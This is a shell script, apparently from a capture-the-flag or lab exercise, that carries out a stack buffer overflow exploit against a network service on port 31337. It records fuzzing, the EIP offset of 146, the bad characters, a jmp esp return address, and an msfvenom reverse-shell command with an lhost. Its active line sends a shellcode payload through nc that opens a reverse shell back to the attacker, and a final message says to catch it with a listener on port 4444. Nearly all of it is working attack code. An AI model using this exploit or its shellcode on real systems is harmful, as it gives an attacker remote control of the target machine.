echo "[+] NOTE : Always use python(not python3) for exploits"
echo "[+] NOTE : TARGET --> $1 , PORT --> $2"

#python -c 'print("A"*100+"B"*50+"C"*50)' | nc 192.168.116.131 31337
echo "[-] Sending payload"

#python -c 'print("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9")' | nc 192.168.116.131 31337

echo "[-] EIP located at 146"
#python -c 'print("A"*146+"B"*4)' | nc 192.168.116.131 31337

echo "[-] Search badchars"
echo "[*] On ESP right click and follow in dump !!"

# python -c 'print("A"*146+"C"*4+"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f")' | nc 192.168.116.131 31337


# python -c 'print("A"*146 + "C"*4 + "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")' | nc 192.168.116.131 31337

echo "[-] Badchars \x00,\x0A"

echo "[*] Run !mona modules on the immunity debugger"
echo "[*] 00000000  FFE4              jmp esp"
echo '[*] Create payload using ==> msfvenom -p windows/shell_reverse_tcp lhost=192.168.116.129 lport=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"'

# python -c 'print "A"*146 + "\xbf\x16\x04\x08" + "\x90"*24 ' | nc 192.168.116.131 31337

python -c 'print "A"*146 + "\xbf\x16\x04\x08" + "\x90"*24 + "\xda\xd8\xd9\x74\x24\xf4\x58\xbb\x28\x66\xb7\x7c\x33\xc9\xb1\x52\x31\x58\x17\x83\xe8\xfc\x03\x70\x75\x55\x89\x7c\x91\x1b\x72\x7c\x62\x7c\xfa\x99\x53\xbc\x98\xea\xc4\x0c\xea\xbe\xe8\xe7\xbe\x2a\x7a\x85\x16\x5d\xcb\x20\x41\x50\xcc\x19\xb1\xf3\x4e\x60\xe6\xd3\x6f\xab\xfb\x12\xb7\xd6\xf6\x46\x60\x9c\xa5\x76\x05\xe8\x75\xfd\x55\xfc\xfd\xe2\x2e\xff\x2c\xb5\x25\xa6\xee\x34\xe9\xd2\xa6\x2e\xee\xdf\x71\xc5\xc4\x94\x83\x0f\x15\x54\x2f\x6e\x99\xa7\x31\xb7\x1e\x58\x44\xc1\x5c\xe5\x5f\x16\x1e\x31\xd5\x8c\xb8\xb2\x4d\x68\x38\x16\x0b\xfb\x36\xd3\x5f\xa3\x5a\xe2\x8c\xd8\x67\x6f\x33\x0e\xee\x2b\x10\x8a\xaa\xe8\x39\x8b\x16\x5e\x45\xcb\xf8\x3f\xe3\x80\x15\x2b\x9e\xcb\x71\x98\x93\xf3\x81\xb6\xa4\x80\xb3\x19\x1f\x0e\xf8\xd2\xb9\xc9\xff\xc8\x7e\x45\xfe\xf2\x7e\x4c\xc5\xa7\x2e\xe6\xec\xc7\xa4\xf6\x11\x12\x6a\xa6\xbd\xcd\xcb\x16\x7e\xbe\xa3\x7c\x71\xe1\xd4\x7f\x5b\x8a\x7f\x7a\x0c\x75\xd7\xf0\x4d\x1d\x2a\xf8\x5c\x82\xa3\x1e\x34\x2a\xe2\x89\xa1\xd3\xaf\x41\x53\x1b\x7a\x2c\x53\x97\x89\xd1\x1a\x50\xe7\xc1\xcb\x90\xb2\xbb\x5a\xae\x68\xd3\x01\x3d\xf7\x23\x4f\x5e\xa0\x74\x18\x90\xb9\x10\xb4\x8b\x13\x06\x45\x4d\x5b\x82\x92\xae\x62\x0b\x56\x8a\x40\x1b\xae\x13\xcd\x4f\x7e\x42\x9b\x39\x38\x3c\x6d\x93\x92\x93\x27\x73\x62\xd8\xf7\x05\x6b\x35\x8e\xe9\xda\xe0\xd7\x16\xd2\x64\xd0\x6f\x0e\x15\x1f\xba\x8a\x35\xc2\x6e\xe7\xdd\x5b\xfb\x4a\x80\x5b\xd6\x89\xbd\xdf\xd2\x71\x3a\xff\x97\x74\x06\x47\x44\x05\x17\x22\x6a\xba\x18\x67"' | nc 10.10.187.115 31337


echo "\n[-] Reverse shell initiated use nc -nlvp 4444 to grab it ^_^ !!"


# python -c 'print "A"*146 + "\xbf\x16\x04\x08" + "\x90"*24 + "\xdb\xc3\xba\x36\xe1\x0f\xdb\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13\x03\x66\xf2\xed\x2e\x7a\x1c\x73\xd0\x82\xdd\x14\x58\x67\xec\x14\x3e\xec\x5f\xa5\x34\xa0\x53\x4e\x18\x50\xe7\x22\xb5\x57\x40\x88\xe3\x56\x51\xa1\xd0\xf9\xd1\xb8\x04\xd9\xe8\x72\x59\x18\x2c\x6e\x90\x48\xe5\xe4\x07\x7c\x82\xb1\x9b\xf7\xd8\x54\x9c\xe4\xa9\x57\x8d\xbb\xa2\x01\x0d\x3a\x66\x3a\x04\x24\x6b\x07\xde\xdf\x5f\xf3\xe1\x09\xae\xfc\x4e\x74\x1e\x0f\x8e\xb1\x99\xf0\xe5\xcb\xd9\x8d\xfd\x08\xa3\x49\x8b\x8a\x03\x19\x2b\x76\xb5\xce\xaa\xfd\xb9\xbb\xb9\x59\xde\x3a\x6d\xd2\xda\xb7\x90\x34\x6b\x83\xb6\x90\x37\x57\xd6\x81\x9d\x36\xe7\xd1\x7d\xe6\x4d\x9a\x90\xf3\xff\xc1\xfc\x30\x32\xf9\xfc\x5e\x45\x8a\xce\xc1\xfd\x04\x63\x89\xdb\xd3\x84\xa0\x9c\x4b\x7b\x4b\xdd\x42\xb8\x1f\x8d\xfc\x69\x20\x46\xfc\x96\xf5\xc9\xac\x38\xa6\xa9\x1c\xf9\x16\x42\x76\xf6\x49\x72\x79\xdc\xe1\x19\x80\xb7\x07\xcf\x8c\x2a\x70\xed\x90\xa5\xdc\x78\x76\xaf\xcc\x2c\x21\x58\x74\x75\xb9\xf9\x79\xa3\xc4\x3a\xf1\x40\x39\xf4\xf2\x2d\x29\x61\xf3\x7b\x13\x24\x0c\x56\x3b\xaa\x9f\x3d\xbb\xa5\x83\xe9\xec\xe2\x72\xe0\x78\x1f\x2c\x5a\x9e\xe2\xa8\xa5\x1a\x39\x09\x2b\xa3\xcc\x35\x0f\xb3\x08\xb5\x0b\xe7\xc4\xe0\xc5\x51\xa3\x5a\xa4\x0b\x7d\x30\x6e\xdb\xf8\x7a\xb1\x9d\x04\x57\x47\x41\xb4\x0e\x1e\x7e\x79\xc7\x96\x07\x67\x77\x58\xd2\x23\x97\xbb\xf6\x59\x30\x62\x93\xe3\x5d\x95\x4e\x27\x58\x16\x7a\xd8\x9f\x06\x0f\xdd\xe4\x80\xfc\xaf\x75\x65\x02\x03\x75\xac"' | nc $1 $2

